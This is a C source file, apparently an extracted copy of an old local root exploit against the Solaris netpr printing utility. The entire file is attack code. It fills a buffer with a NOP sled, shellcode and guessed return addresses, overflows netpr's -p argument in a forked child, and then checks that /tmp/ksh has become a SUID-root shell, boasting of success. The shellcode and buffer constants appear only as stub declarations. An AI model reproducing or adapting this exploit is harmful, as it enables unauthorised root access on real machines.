
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {scalar_t__ st_uid; int st_mode; } ;


 int BUFLEN ;
 int NOP ;
 int O_RDWR ;
 int STDERR_FILENO ;
 int STDIN_FILENO ;
 int STDOUT_FILENO ;
 int WEXITSTATUS (int) ;
 int WIFEXITED (int) ;
 int WIFSIGNALED (int) ;
 int WTERMSIG (int) ;
 int * buf ;
 int close (int) ;
 int dup2 (int,int) ;
 int execl (char*,char*,char*,char*,char*,char*,char*,int *,char*,char*,char*,char*,char*,int *) ;
 int exit (int) ;
 int fork () ;
 unsigned long get_esp () ;
 int memcpy (int *,int ,unsigned long) ;
 int memset (int *,int ,int) ;
 int open (char*,int ,int ) ;
 scalar_t__ pipe (int*) ;
 int printf (char*,...) ;
 int read (int,char*,int) ;
 int shell ;
 scalar_t__ stat (char*,struct stat*) ;
 unsigned long strlen (int ) ;
 long strtol (char*,int *,int ) ;
 unsigned long strtoul (char*,int *,int ) ;
 int wait (int*) ;
 int write (int,char*,int) ;

int
main(int argc, char *argv[])
{
    unsigned long int esp, nop;
    long int offset = 0;
    char *hostname, c;
    int i, null, umbilical[2];
    struct stat st;
    int status;

    if (argc < 2) {
        printf("usage: %s hostname [offset]\n", argv[0]);
        exit(1);
    }

    esp = get_esp();
    hostname = argv[1];
    if (argc > 2)
        offset = strtol(argv[2], ((void*)0), 0);
    if (argc > 3)
        nop = strtoul(argv[3], ((void*)0), 0);
    else
        nop = 942;

    memset(buf, NOP, BUFLEN);
    memcpy(buf+nop, shell, strlen(shell));
    for (i = nop+strlen(shell); i <= BUFLEN-4; i += 4)
        *((int *) &buf[i]) = esp+offset;

    printf("using return address 0x%08x (0x%08x offset %d) [nop %d]\n",
           esp+offset, esp, offset, nop);

    if (stat("/tmp/ksh", &st) < 0) {
        printf("exploit failed; copy /bin/ksh to /tmp first!\n");
        exit(1);
    }

    if (pipe(umbilical) < 0) {
        printf("exploit failed; unable to create a pipe!\n");
        exit(1);
    }

    switch (fork()) {
    case -1:
        printf("exploit failed; unable to fork!\n");
        exit(1);
        break;
    case 0:
        if ((null = open("/dev/null", O_RDWR, 0)) < 0) {
            printf("exploit failed; cannot open /dev/null!\n");
            exit(1);
        }
        dup2(null, STDIN_FILENO);
        dup2(null, STDOUT_FILENO);
        dup2(null, STDERR_FILENO);
        if (null > STDERR_FILENO)
            close(null);
        close(umbilical[0]);
        dup2(umbilical[1], 10);
        execl("/usr/lib/lp/bin/netpr",
              "netpr",
              "-I", "ADM-ADM",
              "-U", "ADM!ADM",
              "-p", buf,
              "-d", hostname,
              "-P", "bsd",
              "/etc/passwd", ((void*)0));
        printf("exploit failed; unable to exec!\n");
        exit(1);
        break;
    default:
        close(umbilical[1]);
        c = 0;
        while (c != '\n') {
            read(umbilical[0], &c, 1);
        }
        c = '\0';
        while (write(umbilical[0], &c, 1) < 1)
            ;
        wait(&status);
        if (WIFSIGNALED(status)) {
            printf("exploit failed; child process died on signal %d "
                   "(try adjusting the offset)\n", WTERMSIG(status));
            exit(1);
        } else if (WIFEXITED(status) && (WEXITSTATUS(status) != 0)) {
            printf("exploit failed; child process exited with unexpected "
                   "return value %d, instead of 0\n", WEXITSTATUS(status));
            exit(1);
        }
        break;
    }

    if (stat("/tmp/ksh", &st) < 0) {
        printf("exploit failed; /tmp/ksh disappeared somehow!\n");
        exit(1);
    } else if (st.st_uid != 0) {
        printf("exploit failed; failed to make /tmp/ksh owned by root!\n");
        exit(1);
    } else if ((st.st_mode & 07777) != 04555) {
        printf("exploit failed; failed to change /tmp/ksh to mode 4555!\n");
        exit(1);
    } else {
        printf("exploit successful; /tmp/ksh is now SUID root, dewd!\n");
        exit(0);
    }
}
